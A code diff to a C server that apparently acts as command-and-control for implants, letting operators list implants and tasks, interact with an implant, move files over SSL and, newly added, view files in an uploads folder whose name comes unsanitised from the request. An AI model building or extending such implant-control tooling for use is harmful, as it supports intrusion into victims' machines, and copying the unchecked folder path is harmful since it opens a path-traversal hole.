@@ -267,17 +267,16 @@ void *operator_handler(void *Args) {
             if (!re) {
                 log_message(LOG_ERROR, "Invalid JSON FROM Implants database");
             }
-
-            
             SSL_write(ssl, implants, strlen(implants));
             free(implants);
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
             char *tasks = GetData(con, "Tasks");
-            //send(sock, tasks, strlen(tasks), 0);
+            if (tasks == NULL) {
+                continue;
+            }
             SSL_write(ssl, tasks, strlen(tasks));
             free(tasks);
         } else if (strcmp(about->valuestring, "implant_id") == 0) {
-
             char *data = interact_with_implant(con, requested_info);
             if (data == NULL) {
                 //send(sock, "ERROR", strlen("ERROR"), 0);
@@ -306,12 +305,29 @@ void *operator_handler(void *Args) {
                 operator_file_download(ssl);
             } else if (strcmp(option->valuestring, "download") == 0) {
                 operator_file_upload(ssl);
+            } else if (strcmp(option->valuestring, "view") == 0) {
+                cJSON *folder = cJSON_GetObjectItem(requested_info, "folder");
+                if (!folder || !cJSON_IsString(folder)) {
+                    log_message(LOG_ERROR, "Invalid Folder");
+                    SSL_write(ssl, "INVALID REQUEST", 15);
+                    continue;
+                }
+                char base_path[BUFFER_SIZE];
+                snprintf(base_path, BUFFER_SIZE, "./uploads/%s", folder->valuestring);
+                cJSON *list = list_files(base_path);
+                if (!list) {
+                    log_message(LOG_ERROR, "Failed To get data from list_files");
+                    SSL_write(ssl, "NO DATA", 7);
+                    continue;
+                }
+                char *arr = cJSON_Print(list);
+                cJSON_Delete(list);
+                SSL_write(ssl, arr, strlen(arr));
+                free(arr);
             }
-            
         }
         cJSON_Delete(requested_info);
     } 
-        
     log_message(LOG_INFO, "Closed connection");
     SSL_free(ssl);
 
@@ -320,8 +336,8 @@ void *operator_handler(void *Args) {
 
 int operator_file_download(SSL *ssl) {
     // check if folder exists
-    if (check_if_dir_exists("./uploads/operators/") == false) {
-        if (create_dir("./uploads/operators") == false) {
+    if (check_if_dir_exists("./uploads/operator/") == false) {
+        if (create_dir("./uploads/operator") == false) {
             return -1;
         }
     }
